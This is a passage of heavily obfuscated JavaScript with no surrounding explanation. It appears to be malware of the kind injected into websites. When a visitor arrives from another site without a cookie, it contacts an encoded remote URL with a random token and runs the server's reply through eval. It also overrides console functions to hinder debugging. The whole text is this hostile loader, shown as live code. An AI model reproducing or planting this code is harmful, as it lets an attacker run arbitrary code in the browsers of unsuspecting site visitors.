n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};